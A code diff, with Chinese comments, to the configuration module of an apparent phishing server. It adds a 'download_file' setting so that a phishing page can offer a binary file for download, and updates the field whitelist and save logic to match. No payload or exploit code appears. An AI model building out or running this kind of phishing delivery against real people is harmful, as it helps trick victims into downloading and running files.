@@ -18,6 +18,7 @@ class PhishingConfig:
     route_report: str = "/report"
     default_module: str = "hello"
     active_page: str = "login"
+    download_file: str = ""        # 钓鱼页面下载的二进制文件名(位于 pages/<active_page>/ 下,空=不提供下载)
     modules_dir: str = "js_modules"
     pages_dir: str = "pages"
     report_max: int = 500
@@ -50,7 +51,7 @@ class PhishingConfig:
 # 配置字段白名单(POST 修改只允许这些字段)
 _CONFIG_FIELDS = (
     "host", "port", "route_payload", "route_report",
-    "default_module", "active_page", "report_max", "max_payload_bytes",
+    "default_module", "active_page", "download_file", "report_max", "max_payload_bytes",
 )
 
 
@@ -85,7 +86,8 @@ def load_config(path: str) -> PhishingConfig:
 def save_config(path: str, cfg: PhishingConfig, updates: Dict[str, Any]) -> tuple:
     """按白名单字段更新配置并写回磁盘。返回 (ok, changed_fields)。"""
     allowed = {"host", "port", "route_payload", "route_report",
-               "default_module", "active_page", "report_max", "max_payload_bytes"}
+               "default_module", "active_page", "download_file",
+               "report_max", "max_payload_bytes"}
     changed = []
     try:
         with open(path, "r", encoding="utf-8") as f:
@@ -104,8 +106,8 @@ def save_config(path: str, cfg: PhishingConfig, updates: Dict[str, Any]) -> tupl
                     continue
             else:
                 v = str(v or "").strip()
-                if not v:
-                    continue
+                if not v and k != "download_file":
+                    continue   # download_file 允许置空(取消下载)
         except (TypeError, ValueError):
             continue
         if raw.get(k) != v:
